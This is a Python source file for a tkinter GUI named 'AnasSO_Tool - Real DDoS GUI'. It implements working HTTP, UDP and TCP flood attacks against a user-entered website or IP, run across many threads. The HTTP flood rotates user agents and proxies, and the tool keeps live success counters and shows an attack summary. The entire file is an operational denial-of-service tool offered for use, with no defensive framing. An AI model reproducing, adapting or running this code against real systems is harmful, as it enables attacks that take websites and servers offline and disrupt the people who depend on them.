import tkinter as tk
from tkinter import messagebox, ttk
import threading
import time
import random
import socket
import requests

BG = "#191a1e"
FG = "#0ff"
BTN_BG = "#ff1010"
ENTRY_BG = "#111"
ENTRY_FG = "#0f0"
FONT = ("Consolas", 13, "bold")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "curl/7.64.1",
    "Wget/1.20.3 (linux-gnu)",
    "Java/11.0.7"
]

def real_http_attack(target, duration, proxies, update_stats, stop_event):
    end = time.time() + duration
    while time.time() < end and not stop_event.is_set():
        proxy = {}
        if proxies:
            p = random.choice(proxies)
            proxy = {"http": p, "https": p}
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        try:
            res = requests.get(target, proxies=proxy, headers=headers, timeout=3)
            if res.status_code in [200, 301, 302, 403, 500, 404]:
                update_stats(True)
            else:
                update_stats(False)
        except:
            update_stats(False)

def real_udp_attack(ip, port, duration, update_stats, stop_event):
    end = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while time.time() < end and not stop_event.is_set():
        try:
            sock.sendto(data, (ip, port))
            update_stats(True)
        except:
            update_stats(False)

def real_tcp_attack(ip, port, duration, update_stats, stop_event):
    end = time.time() + duration
    while time.time() < end and not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.sendall(random._urandom(1024))
            s.close()
            update_stats(True)
        except:
            update_stats(False)

class AnasSOToolGUI:
    def __init__(self, root):
        self.root = root
        root.title("AnasSO_Tool - Real DDoS GUI")
        root.geometry("500x540")
        root.config(bg=BG)

        tk.Label(root, text="AnasSO_Tool", font=("Consolas", 24, "bold"), fg=FG, bg=BG).pack(pady=(10,0))
        tk.Label(root, text="Ultimate Attack GUI 😈", font=("Consolas", 14), fg=BTN_BG, bg=BG).pack()

        self.target_type = tk.StringVar(value="website")
        frame_type = tk.Frame(root, bg=BG)
        frame_type.pack(pady=12)
        tk.Label(frame_type, text="Target Type:", bg=BG, fg=FG, font=FONT).pack(side="left", padx=6)
        tk.Radiobutton(frame_type, text="Website", variable=self.target_type, value="website", bg=BG, fg="#fff", selectcolor=BTN_BG, font=FONT, command=self.update_entry).pack(side="left")
        tk.Radiobutton(frame_type, text="Server (IP)", variable=self.target_type, value="server", bg=BG, fg="#fff", selectcolor=BTN_BG, font=FONT, command=self.update_entry).pack(side="left")

        self.target_label = tk.Label(root, text="Target URL:", bg=BG, fg=FG, font=FONT)
        self.target_label.pack()
        self.entry_target = tk.Entry(root, width=42, font=FONT, bg=ENTRY_BG, fg=ENTRY_FG, insertbackground="#fff")
        self.entry_target.pack()
        self.update_entry()

        self.attack_type = tk.StringVar(value="HTTP")
        frame_attack = tk.Frame(root, bg=BG)
        frame_attack.pack(pady=6)
        tk.Label(frame_attack, text="Attack Type:", bg=BG, fg=FG, font=FONT).pack(side="left")
        atk_menu = ttk.Combobox(frame_attack, textvariable=self.attack_type, values=["HTTP", "UDP", "TCP"], font=FONT, width=7, state="readonly")
        atk_menu.pack(side="left", padx=5)

        self.port_label = tk.Label(root, text="Port:", bg=BG, fg=FG, font=FONT)
        self.entry_port = tk.Entry(root, width=12, font=FONT, bg=ENTRY_BG, fg=ENTRY_FG, insertbackground="#fff")
        self.port_label.pack_forget()
        self.entry_port.pack_forget()

        frame_threads = tk.Frame(root, bg=BG)
        frame_threads.pack(pady=6)
        tk.Label(frame_threads, text="Threads:", bg=BG, fg=FG, font=FONT).pack(side="left")
        self.entry_threads = tk.Entry(frame_threads, width=6, font=FONT, bg=ENTRY_BG, fg=ENTRY_FG, insertbackground="#fff")
        self.entry_threads.insert(0, "10")
        self.entry_threads.pack(side="left", padx=6)

        frame_duration = tk.Frame(root, bg=BG)
        frame_duration.pack(pady=6)
        tk.Label(frame_duration, text="Duration (s):", bg=BG, fg=FG, font=FONT).pack(side="left")
        self.entry_duration = tk.Entry(frame_duration, width=8, font=FONT, bg=ENTRY_BG, fg=ENTRY_FG, insertbackground="#fff")
        self.entry_duration.insert(0, "30")
        self.entry_duration.pack(side="left", padx=6)

        frame_proxy = tk.Frame(root, bg=BG)
        frame_proxy.pack(pady=6)
        tk.Label(frame_proxy, text="Proxy file (HTTP only):", bg=BG, fg=FG, font=FONT).pack(side="left")
        self.entry_proxyfile = tk.Entry(frame_proxy, width=18, font=FONT, bg=ENTRY_BG, fg=ENTRY_FG, insertbackground="#fff")
        self.entry_proxyfile.insert(0, "proxy_list.txt")
        self.entry_proxyfile.pack(side="left", padx=5)

        self.stats_label = tk.Label(root, text="✅: 0  ❌: 0", fg="#0ff", bg=BG, font=("Consolas", 13, "bold"))
        self.stats_label.pack(pady=4)

        self.btn_attack = tk.Button(root, text="Start Attack", font=FONT, bg=BTN_BG, fg="#fff", activebackground="#900", activeforeground="#fff", command=self.start_attack)
        self.btn_attack.pack(pady=12)

        self.btn_stop = tk.Button(root, text="Stop", font=FONT, bg="#333", fg="#fff", activebackground="#111", state="disabled", command=self.stop_attack)
        self.btn_stop.pack()

        self.attack_type.trace("w", lambda *args: self.update_attack_options())
        self.success_count = 0
        self.fail_count = 0
        self.stop_event = threading.Event()
        self.threads = []
        self.attack_summary = {}
        self.attack_start_time = 0

    def update_entry(self):
        if self.target_type.get() == "website":
            self.target_label.config(text="Target URL:")
            self.entry_target.delete(0, tk.END)
            self.entry_target.insert(0, "http://yourwebsite.com/")
        else:
            self.target_label.config(text="Server IP:")
            self.entry_target.delete(0, tk.END)
            self.entry_target.insert(0, "127.0.0.1")

    def update_attack_options(self):
        atype = self.attack_type.get()
        if atype in ["UDP", "TCP"]:
            self.port_label.pack()
            self.entry_port.pack()
            self.port_label.lift()
            self.entry_port.lift()
            if not self.entry_port.get():
                self.entry_port.insert(0, "80")
        else:
            self.port_label.pack_forget()
            self.entry_port.pack_forget()

    def start_attack(self):
        atype = self.attack_type.get()
        target = self.entry_target.get().strip()
        try:
            threads = int(self.entry_threads.get())
            duration = int(self.entry_duration.get())
        except:
            messagebox.showerror("Error", "Enter valid numbers for threads and duration.")
            return

        if not target:
            messagebox.showerror("Error", "Please enter a target!")
            return

        proxies = []
        if atype == "HTTP":
            proxyfile = self.entry_proxyfile.get().strip()
            try:
                with open(proxyfile, "r") as pf:
                    proxies = [line.strip() for line in pf if line.strip()]
            except:
                proxies = []

        port = None
        if atype in ["UDP", "TCP"]:
            try:
                port = int(self.entry_port.get())
            except:
                messagebox.showerror("Error", "Enter a valid port number!")
                return

        self.success_count = 0
        self.fail_count = 0
        self.update_stats()
        self.stop_event.clear()
        self.btn_attack.config(state="disabled")
        self.btn_stop.config(state="normal")
        self.threads = []
        self.attack_summary = {
            "Attack Type": atype,
            "Target": target,
            "Port": port if atype in ["UDP", "TCP"] else "-",
            "Threads": threads,
            "Duration": duration,
        }
        self.attack_start_time = time.time()

        for _ in range(threads):
            if atype == "HTTP":
                t = threading.Thread(target=real_http_attack, args=(target, duration, proxies, self.update_stats_from_thread, self.stop_event))
            elif atype == "UDP":
                t = threading.Thread(target=real_udp_attack, args=(target, port, duration, self.update_stats_from_thread, self.stop_event))
            elif atype == "TCP":
                t = threading.Thread(target=real_tcp_attack, args=(target, port, duration, self.update_stats_from_thread, self.stop_event))
            t.daemon = True
            t.start()
            self.threads.append(t)

        self.root.after(duration*1000, self.stop_attack)

    def stop_attack(self):
        self.stop_event.set()
        self.btn_attack.config(state="normal")
        self.btn_stop.config(state="disabled")
        self.show_attack_summary()

    def update_stats_from_thread(self, success):
        if success:
            self.success_count += 1
        else:
            self.fail_count += 1
        self.stats_label.config(text=f"✅: {self.success_count}  ❌: {self.fail_count}")

    def update_stats(self):
        self.stats_label.config(text=f"✅: {self.success_count}  ❌: {self.fail_count}")

    def show_attack_summary(self):
        elapsed = int(time.time() - self.attack_start_time)
        msg = (
            f"Attack Type: {self.attack_summary['Attack Type']}\n"
            f"Target: {self.attack_summary['Target']}\n"
            f"Port: {self.attack_summary['Port']}\n"
            f"Threads: {self.attack_summary['Threads']}\n"
            f"Successful packets/requests: {self.success_count}\n"
            f"Failed packets/requests: {self.fail_count}\n"
            f"Elapsed time: {elapsed} seconds"
        )
        messagebox.showinfo("Attack Summary", msg)

if __name__ == "__main__":
    root = tk.Tk()
    style = ttk.Style(root)
    style.theme_use('clam')
    style.configure("TNotebook", background=BG, borderwidth=0)
    style.configure("TNotebook.Tab", background="#232323", foreground="#0ff", font=('Consolas', 11, 'bold'), padding=6)
    app = AnasSOToolGUI(root)
    root.mainloop()
